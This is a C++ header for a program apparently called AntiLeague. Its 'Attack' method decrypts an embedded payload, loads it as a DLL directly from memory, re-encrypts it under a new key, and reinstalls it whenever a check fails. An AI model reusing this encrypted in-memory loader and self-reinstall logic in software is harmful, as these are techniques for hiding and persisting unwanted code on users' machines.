#pragma once
#include <string>
#include "MemoryModule.h"

typedef bool (*AntiLeagueProc)();
typedef void (*QuickInstallProc)(std::string* payload, const std::string& dec_key);
typedef void (*InitProc)(std::string* _payload, std::string* payload, const std::string& dec_key);

class c_AntiLeague
{
private:
    HMEMORYMODULE hPayload;
	std::string getPayload();

	c_AntiLeague()
		: hPayload(NULL)
	{
		HANDLE hMutex = CreateMutex(NULL, TRUE, L"AntiLeague");

		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			std::exit(0);
		}
	}

	void cipher();
	void gen_dec_key();

public:
	static c_AntiLeague& getInstance()
	{
		static c_AntiLeague instance;
		return instance;
	}

	std::string dec_key;
	std::string payload;

	void Init();
    void FreeLibrary() { MemoryFreeLibrary(hPayload); hPayload = NULL; }

    template <typename T>
    void Attack(T function, const char* name, std::string* _payload)
    {
        if (hPayload == NULL)
        {
            cipher();

            hPayload = MemoryLoadLibrary(payload.c_str(), payload.size());

            gen_dec_key();
            cipher();

            if (hPayload == NULL)
            {
                MessageBox(NULL, L"Payload Memory Error", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
                std::exit(1);
            }

            function = (T)MemoryGetProcAddress(hPayload, name);

            if (function != NULL)
            {
                if constexpr (std::is_same_v<T, InitProc>)
                {
                    function(_payload, &payload, dec_key);
                }
                else if constexpr (std::is_same_v<T, QuickInstallProc>)
                {
                    function(&payload, dec_key);
                }
                else if constexpr (std::is_same_v<T, AntiLeagueProc>)
                {
                    if (!function())
                    {
                        Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
                        Attack<AntiLeagueProc>(AntiLeagueProc(), "AntiLeague", NULL);
                    }
                }
            }
            else
            {
                MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
                std::exit(1);
            }
        }
        else
        {
            function = (T)MemoryGetProcAddress(hPayload, name);

            if (function != NULL)
            {
                if constexpr (std::is_same_v<T, InitProc>)
                {
                    function(_payload, &payload, dec_key);
                }
                else if constexpr (std::is_same_v<T, QuickInstallProc>)
                {
                    function(&payload, dec_key);
                }
                else if constexpr (std::is_same_v<T, AntiLeagueProc>)
                {
                    if (!function())
                        Attack<QuickInstallProc>(QuickInstallProc(), "QuickInstall", NULL);
                }
            }
            else
            {
                MessageBox(NULL, L"Payload Function Missing", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
                std::exit(1);
            }
        }
    }
};